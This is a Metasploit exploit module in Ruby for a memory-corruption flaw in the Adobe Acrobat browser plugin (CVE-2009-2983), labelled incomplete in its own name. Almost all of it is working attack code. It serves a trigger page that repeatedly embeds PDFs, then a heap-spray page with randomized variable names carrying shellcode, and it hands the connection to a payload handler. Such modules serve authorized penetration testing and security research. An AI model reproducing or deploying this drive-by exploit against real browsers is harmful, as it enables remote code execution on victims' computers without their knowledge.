##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '[INCOMPLETE] Adobe Acrobat Embedded COM Object Memory Corruption ',
      'Description'    => %q{
        This module exploits a memory corruption flaw in the Adobe Acrobat
      plugin for Mozilla Firefox and related browsers. The flaw is triggered
      when an EMBED tag is used to load and unload a PDF document.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'skylined',    # Bug discovery and public PoC
          'hdm',         # Metasploit port and code execution
        ],
      'Version'        => '$Revision$',
      'References'     =>
        [
          ['CVE',   '2009-2983' ],
        ],
      'Payload'        =>
        {
          'Space'          => 1024,
          'BadChars'       => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 2000 SP4 -> Windows 2003 SP0', {'Ret' => 0x0c0c0c0c} ]
        ],
      'DefaultTarget'  => 0))
  end

  def on_request_uri(cli, request)

    @tag ||= rand_text_alpha(8)

    if(request.uri =~ /#{@tag}.html$/)
      content = %Q|
<html><head></head>
<BODY onload='go()'></BODY>
<SCRIPT>
  var sMimeType = null, sHTML = null, iCounter = 1000;
  sMimeType = "application/pdf";
  sHTML = sMimeType + " <EMBED type='" + sMimeType + "'></EMBED>";

  function go() {
    if (sMimeType && iCounter > 0) {
      iCounter--;
      document.body.innerHTML = iCounter.toString() +
      sHTML + sHTML + sHTML + sHTML + sHTML + sHTML;
      setTimeout(go, 0);
    } else if (sMimeType) {
      location.reload();
    }
  }
</SCRIPT>|
      print_status("Sending trigger to #{cli.peerhost}:#{cli.peerport}...")
      # Transmit the response to the client
      send_response_html(cli, content)
    end

    # Re-generate the payload
    return if ((p = regenerate_payload(cli)) == nil)

    # Encode the shellcode
    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

    # Get a unicode friendly version of the return address
    addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]

    # Randomize the javascript variable names
    var_buffer    = rand_text_alpha(rand(30)+2)
    var_shellcode = rand_text_alpha(rand(30)+2)
    var_unescape  = rand_text_alpha(rand(30)+2)
    var_x         = rand_text_alpha(rand(30)+2)
    var_i         = rand_text_alpha(rand(30)+2)

    var_size      = rand_text_alpha(rand(30)+2)
    var_nopsize   = rand_text_alpha(rand(30)+2)
    var_limit     = rand_text_alpha(rand(30)+2)

    var_obj	      = rand_text_alpha(rand(30)+2)
    var_id	      = rand_text_alpha(rand(30)+2)


    # Build out the heap fill
    content = %Q|
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script language="javascript">

  function fill() {
    var #{var_unescape}  = unescape ;
    var #{var_shellcode} = #{var_unescape}( "#{shellcode}" ) ;

    var #{var_size} = #{var_shellcode}.length * 2;
    var #{var_nopsize} = 0x400000 - (#{var_size} + 0x38);
    var #{var_buffer} = #{var_unescape}( "%u#{addr_word}" ) ;

    while (#{var_buffer}.length * 2 < #{var_nopsize}) #{var_buffer}+=#{var_buffer} ;

    #{var_limit} = (0x12000000 - 0x400000) / 0x400000;
    var #{var_x} = new Array() ;
    for ( var #{var_i} =0 ; #{var_i} < #{var_limit} ; #{var_i}++ ) {
      #{var_x}[ #{var_i} ] =
        #{var_buffer} + #{var_shellcode};
    }
  }
</script>
<body onload="fill()">
<iframe src="#{get_resource}/#{@tag}.html">
</iframe>
</body>
</html>
    |

    content = Rex::Text.randomize_space(content)

    print_status("Sending heap fill to #{cli.peerhost}:#{cli.peerport}...")

    # Transmit the response to the client
    send_response_html(cli, content)

    # Handle the payload
    handler(cli)
  end

end

